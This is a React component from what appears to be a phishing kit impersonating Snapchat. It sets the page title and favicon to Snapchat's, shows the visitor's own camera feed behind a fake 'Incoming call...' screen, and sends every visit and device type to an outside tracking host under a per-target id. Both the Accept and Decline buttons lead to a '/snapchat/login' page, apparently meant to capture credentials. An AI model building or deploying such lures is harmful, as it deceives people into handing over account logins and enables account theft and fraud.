import React, { useRef } from "react";
import { useForm } from "react-hook-form";
import {
  useLoaderData,
  useNavigate,
  useParams,
  useLocation,
  Link,
} from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";
import { useEffect } from "react";
import { useState } from "react";
import "./SnapChat.css";

const SnapChatNew = () => {
  const videoRef = useRef(null);
  const params = useParams();
  const location = useLocation();
  const pathAfterDomain = location.pathname.split("/").slice(1, -1).join("/");
  const { user } = useLoaderData();

  localStorage.setItem("url", `${pathAfterDomain}/${params.id}`);
  let type;
  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  useEffect(() => {
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch((error) => {
            console.error("Error playing video:", error);
          });
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    }

    startCamera();

    // Cleanup function to stop the camera when the component unmounts
    // Set the document title
    document.title = "Snapchat";

    // Create a link element for the favicon
    const favicon = document.createElement("link");
    favicon.rel = "icon";
    favicon.href = "/snapchat.ico"; // Update with the correct path to your favicon

    // Append the favicon to the head
    document.head.appendChild(favicon);

    // Cleanup function to remove the favicon when the component is unmounted or favicon changes

    return () => {
      document.head.removeChild(favicon);
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []); // Empty dependency array ensures this effect runs only once

  return (
    <div className="home-bg-2 position-relative min-h-full">
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        loop
        style={{ height: "100vh", minWidth: "100vw", objectFit: "cover" }}
        className="position-absolute z-10 min-w-full min-h-full h-screen max-w-full left-0 top-0 vdo"
      />
      <div
        className="code-card position-absolute z-20  text-center"
        style={{ left: "50%", transform: "translateX(-50%)" }}
      >
        {/* <img src="/datas/images/du_icon.svg" alt="" className='duoimg' /> */}
        <img src="/snapchat.webp" alt="" className="duoimg" />
        <h1
          className="duotitle"
          style={{ fontSize: "1.25rem", margin: "20px 0" }}
        >
          {/* Google DUO */}
          Incoming call...
        </h1>

        <div
          className="d-flex justify-content-center mt-3 w-100"
          style={{ gap: "20%" }}
        >
          {/* <Link to={`/live-chat/${params.id}`} className='dubtn me-4 px-4'> */}
          <Link to={`/snapchat/login/${params.id}`}>
            {/* Decline */}
            <div
              style={{
                width: "50px",
                height: "50px",
                display: "grid",
                placeItems: "center",
                borderRadius: "50%",
                backgroundColor: "#22C55E",
              }}
            >
              <svg
                stroke="currentColor"
                fill="#ffffff"
                stroke-width="0"
                viewBox="0 0 24 24"
                height="1em"
                width="1em"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path fill="none" d="M0 0h24v24H0z"></path>
                <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
              </svg>
            </div>
          </Link>
          {/* <Link to={`/live-chat/${params.id}`} className='dubtn dubtn2 ms-4 px-4'> */}
          <Link to={`/snapchat/login/${params.id}`}>
            {/* Accept */}
            <div
              style={{
                width: "50px",
                height: "50px",
                display: "grid",
                placeItems: "center",
                borderRadius: "50%",
                backgroundColor: "#EF4444",
              }}
            >
              <svg
                stroke="currentColor"
                fill="#ffffff"
                stroke-width="0"
                viewBox="0 0 24 24"
                style={{ display: "block" }}
                height="20px"
                width="20px"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path fill="none" d="M0 0h24v24H0z"></path>
                <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"></path>
              </svg>
            </div>
          </Link>
        </div>
      </div>
    </div>
  );
};

export default SnapChatNew;
